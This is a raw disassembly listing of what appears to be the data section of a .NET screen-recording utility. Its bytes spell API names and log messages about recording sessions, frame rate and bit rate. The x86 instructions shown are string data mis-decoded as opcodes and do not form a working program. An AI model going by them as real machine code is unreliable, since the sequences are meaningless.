  4057ab:	dec    esp
  4057ac:	outs   dx,DWORD PTR ds:[esi]
  4057ad:	arpl   WORD PTR [ecx+0x74],sp
  4057b0:	imul   ebp,DWORD PTR [edi+0x6e],0x6c694600
  4057b7:	gs push esi
  4057b9:	gs jb  0x40582f
  4057bc:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  4057c3:	add    BYTE PTR [edi+0x65],al
  4057c6:	je     0x40581e
  4057c8:	gs jb  0x40583e
  4057cb:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  4057d2:	add    BYTE PTR [edi+0x65],ah
  4057d5:	je     0x405836
  4057d7:	inc    ebx
  4057d8:	jne    0x40584c
  4057da:	jb     0x405841
  4057dc:	outs   dx,BYTE PTR ds:[esi]
  4057dd:	je     0x405822
  4057df:	jne    0x40584d
  4057e1:	je     0x405858
  4057e3:	jb     0x40584a
  4057e5:	add    BYTE PTR [edi+0x65],ah
  4057e8:	je     0x405849
  4057ea:	inc    esi
  4057eb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4057f3:	outs   dx,DWORD PTR ds:[esi]
  4057f4:	outs   dx,BYTE PTR ds:[esi]
  4057f5:	add    BYTE PTR [ebx+0x79],dl
  4057f8:	jae    0x40586e
  4057fa:	gs ins DWORD PTR es:[edi],dx
  4057fc:	cs inc ebx
  4057fe:	outs   dx,DWORD PTR ds:[esi]
  4057ff:	outs   dx,BYTE PTR ds:[esi]
  405800:	imul   sp,WORD PTR [edi+0x75],0x6172
  405806:	je     0x405871
  405808:	outs   dx,DWORD PTR ds:[esi]
  405809:	outs   dx,BYTE PTR ds:[esi]
  40580a:	add    BYTE PTR [ebx+0x6f],al
  40580d:	outs   dx,BYTE PTR ds:[esi]
  40580e:	imul   sp,WORD PTR [edi+0x75],0x6172
  405814:	je     0x40587f
  405816:	outs   dx,DWORD PTR ds:[esi]
  405817:	outs   dx,BYTE PTR ds:[esi]
  405818:	dec    ebp
  405819:	popa   
  40581a:	outs   dx,BYTE PTR ds:[esi]
  40581b:	popa   
  40581c:	addr16 gs jb 0x405820
  405820:	push   ebx
  405821:	jns    0x405896
  405823:	je     0x40588a
  405825:	ins    DWORD PTR es:[edi],dx
  405826:	cs inc ebx
  405828:	outs   dx,DWORD PTR ds:[esi]
  405829:	ins    BYTE PTR es:[edi],dx
  40582a:	ins    BYTE PTR es:[edi],dx
  40582b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405830:	outs   dx,BYTE PTR ds:[esi]
  405831:	jae    0x405861
  405833:	push   ebx
  405834:	jo     0x40589b
  405836:	arpl   WORD PTR [ecx+0x61],bp
  405839:	ins    BYTE PTR es:[edi],dx
  40583a:	imul   edi,DWORD PTR [edx+0x65],0x614e0064
  405841:	ins    DWORD PTR es:[edi],dx
  405842:	gs push esi
  405844:	popa   
  405845:	ins    BYTE PTR es:[edi],dx
  405846:	jne    0x4058ad
  405848:	inc    ebx
  405849:	outs   dx,DWORD PTR ds:[esi]
  40584a:	ins    BYTE PTR es:[edi],dx
  40584b:	ins    BYTE PTR es:[edi],dx
  40584c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405851:	outs   dx,BYTE PTR ds:[esi]
  405852:	add    BYTE PTR [edi+0x65],ah
  405855:	je     0x4058b6
  405857:	inc    ecx
  405858:	jo     0x4058ca
  40585a:	push   ebx
  40585b:	gs je  0x4058d2
  40585e:	imul   ebp,DWORD PTR [esi+0x67],0x65670073
  405865:	je     0x4058c6
  405867:	dec    ecx
  405868:	je     0x4058cf
  40586a:	ins    DWORD PTR es:[edi],dx
  40586b:	add    BYTE PTR [ecx+0x73],cl
  40586e:	dec    esi
  40586f:	jne    0x4058dd
  405871:	ins    BYTE PTR es:[edi],dx
  405872:	dec    edi
  405873:	jb     0x4058ba
  405875:	ins    DWORD PTR es:[edi],dx
  405876:	jo     0x4058ec
  405878:	jns    0x40587a
  40587a:	push   ebp
  40587b:	dec    ecx
  40587c:	outs   dx,BYTE PTR ds:[esi]
  40587d:	je     0x4058b2
  40587f:	xor    al,BYTE PTR [eax]
  405881:	outs   dx,DWORD PTR ds:[esi]
  405882:	jo     0x4058e3
  405884:	inc    ebp
  405885:	jno    0x4058fc
  405887:	popa   
  405888:	ins    BYTE PTR es:[edi],dx
  405889:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x6d756e45
  405891:	gs jb  0x4058f5
  405894:	je     0x405905
  405896:	jb     0x405898
  405898:	inc    edi
  405899:	gs je  0x4058e1
  40589c:	outs   dx,BYTE PTR ds:[esi]
  40589d:	jne    0x40590c
  40589f:	gs jb  0x405903
  4058a2:	je     0x405913
  4058a4:	jb     0x4058a6
  4058a6:	addr16 gs je 0x405909
  4058aa:	inc    ebx
  4058ab:	jne    0x40591f
  4058ad:	jb     0x405914
  4058af:	outs   dx,BYTE PTR ds:[esi]
  4058b0:	je     0x4058b2
  4058b2:	dec    ebp
  4058b3:	outs   dx,DWORD PTR ds:[esi]
  4058b4:	jbe    0x40591b
  4058b6:	dec    esi
  4058b7:	gs js  0x40592e
  4058ba:	add    BYTE PTR [ecx+ebp*2+0x6d],dl
  4058be:	gs jb  0x405904
  4058c1:	popa   
  4058c2:	ins    BYTE PTR es:[edi],dx
  4058c3:	ins    BYTE PTR es:[edi],dx
  4058c4:	bound  esp,QWORD PTR [ecx+0x63]
  4058c7:	imul   eax,DWORD PTR [eax],0x41
  4058ca:	jb     0x405933
  4058cc:	jne    0x40593b
  4058ce:	outs   dx,BYTE PTR gs:[esi]
  4058d0:	je     0x405917
  4058d2:	js     0x405937
  4058d4:	gs jo  0x40594b
  4058d7:	imul   ebp,DWORD PTR [edi+0x6e],0x766e4900
  4058de:	outs   dx,DWORD PTR ds:[esi]
  4058df:	imul   esp,DWORD PTR [ebp+0x0],0x43
  4058e3:	push   0x65676e61
  4058e8:	add    BYTE PTR [ebx+0x79],dl
  4058eb:	jae    0x405961
  4058ed:	gs ins DWORD PTR es:[edi],dx
  4058ef:	cs inc ebx
  4058f1:	outs   dx,DWORD PTR ds:[esi]
  4058f2:	ins    DWORD PTR es:[edi],dx
  4058f3:	jo     0x405964
  4058f5:	outs   dx,BYTE PTR ds:[esi]
  4058f6:	outs   dx,BYTE PTR gs:[esi]
  4058f8:	je     0x405947
  4058fa:	outs   dx,DWORD PTR ds:[esi]
  4058fb:	fs gs ins BYTE PTR es:[edi],dx
  4058fe:	add    BYTE PTR [edi+0x69],dl
  405901:	outs   dx,BYTE PTR ds:[esi]
  405902:	xor    esi,DWORD PTR [edx]
  405904:	inc    ebp
  405905:	js     0x40596a
  405907:	gs jo  0x40597e
  40590a:	imul   ebp,DWORD PTR [edi+0x6e],0x63632e00
  405911:	je     0x405982
  405913:	jb     0x405915
  405915:	inc    esp
  405916:	ins    BYTE PTR es:[edi],dx
  405917:	ins    BYTE PTR es:[edi],dx
  405918:	dec    ecx
  405919:	ins    DWORD PTR es:[edi],dx
  40591a:	jo     0x40598b
  40591c:	jb     0x405992
  40591e:	inc    ecx
  40591f:	je     0x405995
  405921:	jb     0x40598c
  405923:	bound  esi,QWORD PTR [ebp+0x74]
  405926:	add    BYTE PTR gs:[ebp+0x69],cl
  40592a:	arpl   WORD PTR [edx+0x6f],si
  40592d:	jae    0x40599e
  40592f:	data16 je 0x405960
  405932:	push   esi
  405933:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40593a:	jne    0x4059a0
  40593c:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  405943:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  40594b:	cs push esi
  40594d:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  405955:	jb     0x4059bb
  405957:	gs jb  0x40599f
  40595a:	outs   dx,BYTE PTR ds:[esi]
  40595b:	imul   ebp,DWORD PTR [bp+0x65],0x6c6c642e
  405963:	add    BYTE PTR [ebx+0x79],dl
  405966:	jae    0x4059dc
  405968:	gs ins DWORD PTR es:[edi],dx
  40596a:	cs inc ebx
  40596c:	outs   dx,DWORD PTR ds:[esi]
  40596d:	fs gs inc esp
  405970:	outs   dx,DWORD PTR ds:[esi]
  405971:	ins    DWORD PTR es:[edi],dx
  405972:	cs inc ebx
  405974:	outs   dx,DWORD PTR ds:[esi]
  405975:	ins    DWORD PTR es:[edi],dx
  405976:	jo     0x4059e1
  405978:	ins    BYTE PTR es:[edi],dx
  405979:	gs jb  0x40597c
  40597c:	inc    edi
  40597d:	outs   dx,BYTE PTR gs:[esi]
  40597f:	gs jb  0x4059e3
  405982:	je     0x4059e9
  405984:	fs inc ebx
  405986:	outs   dx,DWORD PTR ds:[esi]
  405987:	fs gs inc ecx
  40598a:	je     0x405a00
  40598c:	jb     0x4059f7
  40598e:	bound  esi,QWORD PTR [ebp+0x74]
  405991:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  405996:	jne    0x4059ff
  405998:	addr16 gs jb 0x4059ea
  40599c:	outs   dx,DWORD PTR ds:[esi]
  40599d:	outs   dx,BYTE PTR ds:[esi]
  40599e:	push   ebp
  40599f:	jae    0x405a06
  4059a1:	jb     0x4059e6
  4059a3:	outs   dx,DWORD PTR ds:[esi]
  4059a4:	fs gs inc ecx
  4059a7:	je     0x405a1d
  4059a9:	jb     0x405a14
  4059ab:	bound  esi,QWORD PTR [ebp+0x74]
  4059ae:	add    BYTE PTR gs:[edx+0x65],dl
  4059b2:	data16 gs jb 0x405a1b
  4059b6:	outs   dx,BYTE PTR ds:[esi]
  4059b7:	arpl   WORD PTR [ebp+0x45],sp
  4059ba:	jno    0x405a31
  4059bc:	popa   
  4059bd:	ins    BYTE PTR es:[edi],dx
  4059be:	jae    0x4059c0
  4059c0:	addr16 gs je 0x405a23
  4059c4:	inc    ecx
  4059c5:	jae    0x405a3a
  4059c7:	gs ins DWORD PTR es:[edi],dx
  4059c9:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4059cd:	inc    edi
  4059ce:	gs je  0x405a24
  4059d1:	je     0x405a45
  4059d3:	imul   ebp,DWORD PTR [esi+0x67],0x69644500
  4059da:	je     0x405a4b
  4059dc:	jb     0x405a20
  4059de:	jb     0x405a4f
  4059e0:	ja     0x405a55
  4059e2:	popa   
  4059e3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4059e7:	je     0x405a5d
  4059e9:	jb     0x405a54
  4059eb:	bound  esi,QWORD PTR [ebp+0x74]
  4059ee:	add    BYTE PTR gs:[ebp+0x64],al
  4059f2:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4059fa:	jae    0x405a5d
  4059fc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  405a00:	je     0x405a63
  405a02:	je     0x405a69
  405a04:	add    BYTE PTR [ebp+0x69],cl
  405a07:	arpl   WORD PTR [edx+0x6f],si
  405a0a:	jae    0x405a7b
  405a0c:	data16 je 0x405a3d
  405a0f:	push   esi
  405a10:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  405a17:	jne    0x405a7d
  405a19:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  405a20:	push   esp
  405a21:	outs   dx,DWORD PTR ds:[esi]
  405a22:	outs   dx,DWORD PTR ds:[esi]
  405a23:	ins    BYTE PTR es:[edi],dx
  405a24:	jae    0x405a54
  405a26:	dec    ebp
  405a27:	gs imul esp,DWORD PTR fs:[ecx+0x46],0x646e756f
  405a30:	popa   
  405a31:	je     0x405a9c
  405a33:	outs   dx,DWORD PTR ds:[esi]
  405a34:	outs   dx,BYTE PTR ds:[esi]
  405a35:	push   edx
  405a36:	arpl   WORD PTR gs:[edi+0x72],bp
  405a3a:	fs gs jb 0x405a6c
  405a3e:	push   edx
  405a3f:	gs jae 0x405ab1
  405a42:	jne    0x405ab6
  405a44:	arpl   WORD PTR [ebp+0x2e],sp
  405a47:	jb     0x405aae
  405a49:	jae    0x405aba
  405a4b:	jne    0x405abf
  405a4d:	arpl   WORD PTR [ebp+0x73],sp
  405a50:	add    BYTE PTR [eax],al
  405a52:	add    BYTE PTR [eax],al
  405a54:	add    BYTE PTR [edi+0x3d],cl
  405a57:	add    BYTE PTR ds:0x3d003d00,bh
  405a5d:	add    BYTE PTR ds:0x3d003d00,bh
  405a63:	add    BYTE PTR ds:0x3d003d00,bh
  405a69:	add    BYTE PTR ds:0x3d003d00,bh
  405a6f:	add    BYTE PTR ds:0x3d003d00,bh
  405a75:	add    BYTE PTR ds:0x3d003d00,bh
  405a7b:	add    BYTE PTR ds:0x3d003d00,bh
  405a81:	add    BYTE PTR ds:0x3d003d00,bh
  405a87:	add    BYTE PTR ds:0x3d003d00,bh
  405a8d:	add    BYTE PTR ds:0x3d003d00,bh
  405a93:	add    BYTE PTR ds:0x3d003d00,bh
  405a99:	add    BYTE PTR ds:0x3d003d00,bh
  405a9f:	add    BYTE PTR ds:0x3d00,bh
  405aa5:	cmp    DWORD PTR [ebx+0x0],edx
  405aa8:	je     0x405aaa
  405aaa:	popa   
  405aab:	add    BYTE PTR [edx+0x0],dh
  405aae:	je     0x405ab0
  405ab0:	imul   eax,DWORD PTR [eax],0x67006e
  405ab6:	and    BYTE PTR [eax],al
  405ab8:	popa   
  405ab9:	add    BYTE PTR [eax],ah
  405abb:	add    BYTE PTR [esi+0x0],ch
  405abe:	add    BYTE PTR gs:[edi+0x0],dh
  405ac2:	and    BYTE PTR [eax],al
  405ac4:	jae    0x405ac6
  405ac6:	add    BYTE PTR gs:[ebx+0x0],dh
  405aca:	jae    0x405acc
  405acc:	imul   eax,DWORD PTR [eax],0x6e006f
  405ad2:	and    BYTE PTR [eax],al
  405ad4:	cmp    al,BYTE PTR [eax]
  405ad6:	and    BYTE PTR [eax],al
  405ad8:	jnp    0x405ada
  405ada:	xor    BYTE PTR [eax],al
  405adc:	jge    0x405ade
  405ade:	add    BYTE PTR [ecx+0x53],bl
  405ae1:	add    BYTE PTR [ebp+0x0],dh
  405ae4:	arpl   WORD PTR [eax],ax
  405ae6:	arpl   WORD PTR [eax],ax
  405ae8:	add    BYTE PTR gs:[ebx+0x0],dh
  405aec:	jae    0x405aee
  405aee:	data16 add BYTE PTR [ebp+0x0],dh
  405af2:	ins    BYTE PTR es:[edi],dx
  405af3:	add    BYTE PTR [eax+eax*1+0x79],ch
  405af7:	add    BYTE PTR [eax],ah
  405af9:	add    BYTE PTR [ecx+0x0],cl
  405afc:	outs   dx,BYTE PTR ds:[esi]
  405afd:	add    BYTE PTR [ecx+0x0],ch
  405b00:	je     0x405b02
  405b02:	imul   eax,DWORD PTR [eax],0x6c0061
  405b08:	imul   eax,DWORD PTR [eax],0x65007a
  405b0e:	add    BYTE PTR fs:[eax],ah
  405b11:	add    BYTE PTR [eax+eax*1+0x68],dh
  405b15:	add    BYTE PTR [ebp+0x0],ah
  405b18:	and    BYTE PTR [eax],al
  405b1a:	jb     0x405b1c
  405b1c:	add    BYTE PTR gs:[ebx+0x0],ah
  405b20:	outs   dx,DWORD PTR ds:[esi]
  405b21:	add    BYTE PTR [edx+0x0],dh
  405b24:	add    BYTE PTR fs:[ebp+0x0],ah
  405b28:	jb     0x405b2a
  405b2a:	and    BYTE PTR [eax],al
  405b2c:	outs   dx,DWORD PTR ds:[esi]
  405b2d:	add    BYTE PTR [edx+0x0],ah
  405b30:	push   0x0
  405b32:	add    BYTE PTR gs:[ebx+0x0],ah
  405b36:	je     0x405b38
  405b38:	add    BYTE PTR [edi],dl
  405b3a:	push   ebx
  405b3b:	add    BYTE PTR [ebp+0x0],ah
  405b3e:	jae    0x405b40
  405b40:	jae    0x405b42
  405b42:	imul   eax,DWORD PTR [eax],0x6e006f
  405b48:	and    BYTE PTR [eax],al
  405b4a:	inc    ebp
  405b4b:	add    BYTE PTR [esi+0x0],ch
  405b4e:	add    BYTE PTR fs:[eax],al
  405b51:	xor    edx,DWORD PTR [ebp+0x0]
  405b54:	outs   dx,BYTE PTR ds:[esi]
  405b55:	add    BYTE PTR [eax+0x0],ch
  405b58:	popa   
  405b59:	add    BYTE PTR [esi+0x0],ch
  405b5c:	add    BYTE PTR fs:[eax+eax*1+0x65],ch
  405b61:	add    BYTE PTR [eax+eax*1+0x20],ah
  405b65:	add    BYTE PTR [ebp+0x0],al
  405b68:	js     0x405b6a
  405b6a:	arpl   WORD PTR [eax],ax
  405b6c:	add    BYTE PTR gs:[eax+0x0],dh
  405b70:	je     0x405b72
  405b72:	imul   eax,DWORD PTR [eax],0x6e006f
  405b78:	and    BYTE PTR [eax],al
  405b7a:	cmp    al,BYTE PTR [eax]
  405b7c:	and    BYTE PTR [eax],al
  405b7e:	jnp    0x405b80
  405b80:	xor    BYTE PTR [eax],al
  405b82:	jge    0x405b84
  405b84:	add    BYTE PTR [eax+0x65004dcf],al
  405b8a:	add    BYTE PTR [eax+eax*1+0x69],ah
  405b8e:	add    BYTE PTR [ecx+0x0],ah
  405b91:	inc    esi
  405b92:	add    BYTE PTR [edi+0x0],ch
  405b95:	jne    0x405b97
  405b97:	outs   dx,BYTE PTR ds:[esi]
  405b98:	add    BYTE PTR [eax+eax*1+0x61],ah
  405b9c:	add    BYTE PTR [eax+eax*1+0x69],dh
  405ba0:	add    BYTE PTR [edi+0x0],ch
  405ba3:	outs   dx,BYTE PTR ds:[esi]
  405ba4:	add    BYTE PTR [edx+0x0],dl
  405ba7:	add    BYTE PTR gs:[ebx+0x0],ah
  405bab:	outs   dx,DWORD PTR ds:[esi]
  405bac:	add    BYTE PTR [edx+0x0],dh
  405baf:	add    BYTE PTR fs:[ebp+0x0],ah
  405bb3:	jb     0x405bb5
  405bb5:	and    BYTE PTR [eax],al
  405bb7:	cmp    al,BYTE PTR [eax]
  405bb9:	and    BYTE PTR [eax],al
  405bbb:	push   ebx
  405bbc:	add    BYTE PTR [eax+eax*1+0x61],dh
  405bc0:	add    BYTE PTR [edx+0x0],dh
  405bc3:	je     0x405bc5
  405bc5:	dec    ebp
  405bc6:	add    BYTE PTR [ebp+0x0],ah
  405bc9:	add    BYTE PTR fs:[ecx+0x0],ch
  405bcd:	popa   
  405bce:	add    BYTE PTR [edx+0x0],dl
  405bd1:	add    BYTE PTR gs:[ebx+0x0],ah
  405bd5:	outs   dx,DWORD PTR ds:[esi]
  405bd6:	add    BYTE PTR [edx+0x0],dh
  405bd9:	add    BYTE PTR fs:[ebp+0x0],ah
  405bdd:	jb     0x405bdf
  405bdf:	and    BYTE PTR [eax],al
  405be1:	cmp    al,BYTE PTR [eax]
  405be3:	and    BYTE PTR [eax],al
  405be5:	inc    edx
  405be6:	add    BYTE PTR [ecx+0x0],ch
  405be9:	je     0x405beb
  405beb:	push   edx
  405bec:	add    BYTE PTR [ecx+0x0],ah
  405bef:	je     0x405bf1
  405bf1:	add    BYTE PTR gs:[eax],ah
  405bf4:	add    BYTE PTR [ebx+0x0],bh
  405bf7:	xor    BYTE PTR [eax],al
  405bf9:	jge    0x405bfb
  405bfb:	and    BYTE PTR [eax],al
  405bfd:	inc    esi
  405bfe:	add    BYTE PTR [edx+0x0],dh
  405c01:	popa   
  405c02:	add    BYTE PTR [ebp+0x0],ch
  405c05:	add    BYTE PTR gs:[edx+0x0],dl
  405c09:	popa   
  405c0a:	add    BYTE PTR [eax+eax*1+0x65],dh
  405c0e:	add    BYTE PTR [eax],ah
  405c10:	add    BYTE PTR [ebx+0x0],bh
  405c13:	xor    DWORD PTR [eax],eax
  405c15:	jge    0x405c17
  405c17:	and    BYTE PTR [eax],al
  405c19:	inc    ecx
  405c1a:	add    BYTE PTR [ebp+0x0],dh
  405c1d:	add    BYTE PTR fs:[ecx+0x0],ch
  405c21:	outs   dx,DWORD PTR ds:[esi]
  405c22:	add    BYTE PTR [eax],ah
  405c24:	add    BYTE PTR [ebx+0x0],bh
  405c27:	xor    al,BYTE PTR [eax]
  405c29:	jge    0x405c2b
  405c2b:	and    BYTE PTR [eax],al
  405c2d:	push   esi
  405c2e:	add    BYTE PTR [ecx+0x0],ch
  405c31:	add    BYTE PTR fs:[ebp+0x0],ah
  405c35:	outs   dx,DWORD PTR ds:[esi]
  405c36:	add    BYTE PTR [eax],ah
  405c38:	add    BYTE PTR [ebx+0x0],bh
  405c3b:	xor    eax,DWORD PTR [eax]
  405c3d:	jge    0x405c3f
  405c3f:	and    BYTE PTR [eax],al
  405c41:	dec    edi
  405c42:	add    BYTE PTR [ebp+0x0],dh
  405c45:	je     0x405c47
  405c47:	jo     0x405c49
  405c49:	jne    0x405c4b
  405c4b:	je     0x405c4d
  405c4d:	and    BYTE PTR [eax],al
  405c4f:	jnp    0x405c51
  405c51:	xor    al,0x0
  405c53:	jge    0x405c55
  405c55:	add    BYTE PTR [ecx+0x55],dl
  405c58:	add    BYTE PTR [esi+0x0],ch
  405c5b:	popa   
  405c5c:	add    BYTE PTR [edx+0x0],ah
  405c5f:	ins    BYTE PTR es:[edi],dx
  405c60:	add    BYTE PTR [ebp+0x0],ah
  405c63:	and    BYTE PTR [eax],al
  405c65:	je     0x405c67
  405c67:	outs   dx,DWORD PTR ds:[esi]
  405c68:	add    BYTE PTR [eax],ah
  405c6a:	add    BYTE PTR [esi+0x0],ah
  405c6d:	imul   eax,DWORD PTR [eax],0x64006e
  405c73:	and    BYTE PTR [eax],al
  405c75:	add    BYTE PTR fs:[ebp+0x0],ah
  405c79:	data16 add BYTE PTR [ecx+0x0],ah
  405c7d:	jne    0x405c7f
  405c7f:	ins    BYTE PTR es:[edi],dx
  405c80:	add    BYTE PTR [eax+eax*1+0x20],dh
  405c84:	add    BYTE PTR [ecx+0x0],al
  405c87:	jne    0x405c89
  405c89:	add    BYTE PTR fs:[ecx+0x0],ch
  405c8d:	outs   dx,DWORD PTR ds:[esi]
  405c8e:	add    BYTE PTR [eax],ah
  405c90:	add    BYTE PTR [eax+eax*1+0x65],ah
  405c94:	add    BYTE PTR [esi+0x0],dh
  405c97:	imul   eax,DWORD PTR [eax],0x650063
  405c9d:	cmp    al,BYTE PTR [eax]
  405c9f:	and    BYTE PTR [eax],al
  405ca1:	jnp    0x405ca3
  405ca3:	xor    BYTE PTR [eax],al
  405ca5:	jge    0x405ca7
  405ca7:	add    BYTE PTR [ebx],ah
  405ca9:	inc    ecx
  405caa:	add    BYTE PTR [ebp+0x0],dh
  405cad:	add    BYTE PTR fs:[ecx+0x0],ch
  405cb1:	outs   dx,DWORD PTR ds:[esi]
  405cb2:	add    BYTE PTR [eax],ah
  405cb4:	add    BYTE PTR [esi+0x0],cl
  405cb7:	outs   dx,DWORD PTR ds:[esi]
  405cb8:	add    BYTE PTR [eax+eax*1+0x20],dh
  405cbc:	add    BYTE PTR [ebp+0x0],ah
  405cbf:	outs   dx,BYTE PTR ds:[esi]
  405cc0:	add    BYTE PTR [ecx+0x0],ah
  405cc3:	bound  eax,QWORD PTR [eax]
  405cc5:	ins    BYTE PTR es:[edi],dx
  405cc6:	add    BYTE PTR [ebp+0x0],ah
  405cc9:	add    BYTE PTR fs:[eax],al
  405ccc:	popa   
  405ccd:	inc    ebx
  405cce:	add    BYTE PTR [ecx+0x0],ah
  405cd1:	ins    BYTE PTR es:[edi],dx
  405cd2:	add    BYTE PTR [eax+eax*1+0x69],ch
  405cd6:	add    BYTE PTR [esi+0x0],ch
  405cd9:	add    BYTE PTR [bx+si],ah
  405cdc:	add    BYTE PTR [edx+0x0],dl
  405cdf:	add    BYTE PTR gs:[ebx+0x0],ah
  405ce3:	outs   dx,DWORD PTR ds:[esi]
  405ce4:	add    BYTE PTR [edx+0x0],dh
  405ce7:	add    BYTE PTR fs:[ebp+0x0],ah
  405ceb:	jb     0x405ced
  405ced:	inc    ebp
  405cee:	add    BYTE PTR [esi+0x0],ch
  405cf1:	add    BYTE PTR [bx+di+0x0],ch
  405cf5:	outs   dx,BYTE PTR ds:[esi]
  405cf6:	add    BYTE PTR [ebp+0x0],ah
  405cf9:	push   edi
  405cfa:	add    BYTE PTR [edx+0x0],dh
  405cfd:	popa   
  405cfe:	add    BYTE PTR [eax+0x0],dh
  405d01:	jo     0x405d03
  405d03:	add    BYTE PTR gs:[edx+0x0],dh
  405d07:	add    BYTE PTR cs:[ebx+0x0],dl
  405d0b:	je     0x405d0d
  405d0d:	popa   
  405d0e:	add    BYTE PTR [edx+0x0],dh
  405d11:	je     0x405d13
  405d13:	push   esi
  405d14:	add    BYTE PTR [ecx+0x0],ch
  405d17:	add    BYTE PTR fs:[ebp+0x0],ah
  405d1b:	outs   dx,DWORD PTR ds:[esi]
  405d1c:	add    BYTE PTR [edx+0x0],dl
  405d1f:	add    BYTE PTR gs:[ebx+0x0],ah
  405d23:	outs   dx,DWORD PTR ds:[esi]
  405d24:	add    BYTE PTR [edx+0x0],dh
  405d27:	add    BYTE PTR fs:[ebp+0x0],ah
  405d2b:	jb     0x405d2d
  405d2d:	add    BYTE PTR [ecx+0x53],bh
  405d30:	add    BYTE PTR [ebp+0x0],dh
  405d33:	arpl   WORD PTR [eax],ax
  405d35:	arpl   WORD PTR [eax],ax
  405d37:	add    BYTE PTR gs:[ebx+0x0],dh
  405d3b:	jae    0x405d3d
  405d3d:	data16 add BYTE PTR [ebp+0x0],dh
  405d41:	ins    BYTE PTR es:[edi],dx
  405d42:	add    BYTE PTR [eax+eax*1+0x79],ch
  405d46:	add    BYTE PTR [eax],ah
  405d48:	add    BYTE PTR [ebx+0x0],ah
  405d4b:	popa   
  405d4c:	add    BYTE PTR [eax+eax*1+0x6c],ch
  405d50:	add    BYTE PTR [ebp+0x0],ah
  405d53:	add    BYTE PTR fs:[eax],ah
  405d56:	add    BYTE PTR [edx+0x0],dl
  405d59:	add    BYTE PTR gs:[ebx+0x0],ah
  405d5d:	outs   dx,DWORD PTR ds:[esi]
  405d5e:	add    BYTE PTR [edx+0x0],dh
  405d61:	add    BYTE PTR fs:[ebp+0x0],ah
  405d65:	jb     0x405d67
  405d67:	inc    ebp
  405d68:	add    BYTE PTR [esi+0x0],ch
  405d6b:	add    BYTE PTR [bx+di+0x0],ch
  405d6f:	outs   dx,BYTE PTR ds:[esi]
  405d70:	add    BYTE PTR [ebp+0x0],ah
  405d73:	push   edi
  405d74:	add    BYTE PTR [edx+0x0],dh
  405d77:	popa   
  405d78:	add    BYTE PTR [eax+0x0],dh
  405d7b:	jo     0x405d7d
  405d7d:	add    BYTE PTR gs:[edx+0x0],dh
  405d81:	add    BYTE PTR cs:[ebx+0x0],dl
  405d85:	je     0x405d87
  405d87:	popa   
  405d88:	add    BYTE PTR [edx+0x0],dh
  405d8b:	je     0x405d8d
  405d8d:	push   esi
  405d8e:	add    BYTE PTR [ecx+0x0],ch
  405d91:	add    BYTE PTR fs:[ebp+0x0],ah
  405d95:	outs   dx,DWORD PTR ds:[esi]
  405d96:	add    BYTE PTR [edx+0x0],dl
  405d99:	add    BYTE PTR gs:[ebx+0x0],ah
  405d9d:	outs   dx,DWORD PTR ds:[esi]
  405d9e:	add    BYTE PTR [edx+0x0],dh
  405da1:	add    BYTE PTR fs:[ebp+0x0],ah
  405da5:	jb     0x405da7
  405da7:	add    BYTE PTR ds:0x610043,dh
  405dad:	ins    BYTE PTR es:[edi],dx
  405dae:	add    BYTE PTR [eax+eax*1+0x69],ch
  405db2:	add    BYTE PTR [esi+0x0],ch
  405db5:	add    BYTE PTR [bx+si],ah
  405db8:	add    BYTE PTR [eax+0x0],dl
  405dbb:	popa   
  405dbc:	add    BYTE PTR [ebp+0x0],dh
  405dbf:	jae    0x405dc1
  405dc1:	add    BYTE PTR gs:[ebp+0x0],cl
  405dc5:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  405dca:	add    BYTE PTR [ecx+0x0],ah
  405dcd:	push   edx
  405dce:	add    BYTE PTR [ebp+0x0],ah
  405dd1:	arpl   WORD PTR [eax],ax
  405dd3:	outs   dx,DWORD PTR ds:[esi]
  405dd4:	add    BYTE PTR [edx+0x0],dh
  405dd7:	add    BYTE PTR fs:[ebp+0x0],ah
  405ddb:	jb     0x405ddd
  405ddd:	add    BYTE PTR [ebx+0x50],dl
  405de0:	add    BYTE PTR [ecx+0x0],ah
  405de3:	jne    0x405de5
  405de5:	jae    0x405de7
  405de7:	add    BYTE PTR gs:[ebp+0x0],cl
  405deb:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  405df0:	add    BYTE PTR [ecx+0x0],ah
  405df3:	push   edx
  405df4:	add    BYTE PTR [ebp+0x0],ah
  405df7:	arpl   WORD PTR [eax],ax
  405df9:	outs   dx,DWORD PTR ds:[esi]
  405dfa:	add    BYTE PTR [edx+0x0],dh
  405dfd:	add    BYTE PTR fs:[ebp+0x0],ah
  405e01:	jb     0x405e03
  405e03:	and    BYTE PTR [eax],al
  405e05:	inc    ebx
  405e06:	add    BYTE PTR [edi+0x0],ch
  405e09:	ins    DWORD PTR es:[edi],dx
  405e0a:	add    BYTE PTR [eax+0x0],dh
  405e0d:	ins    BYTE PTR es:[edi],dx
  405e0e:	add    BYTE PTR [ebp+0x0],ah
  405e11:	je     0x405e13
  405e13:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  405e18:	add    BYTE PTR [ebx+0x0],dl
  405e1b:	jne    0x405e1d
  405e1d:	arpl   WORD PTR [eax],ax
  405e1f:	arpl   WORD PTR [eax],ax
  405e21:	add    BYTE PTR gs:[ebx+0x0],dh
  405e25:	jae    0x405e27
  405e27:	data16 add BYTE PTR [ebp+0x0],dh
  405e2b:	ins    BYTE PTR es:[edi],dx
  405e2c:	add    BYTE PTR [eax+eax*1+0x79],ch
  405e30:	add    BYTE PTR [eax],al
  405e32:	aaa    
  405e33:	inc    ebx
  405e34:	add    BYTE PTR [ecx+0x0],ah
  405e37:	ins    BYTE PTR es:[edi],dx
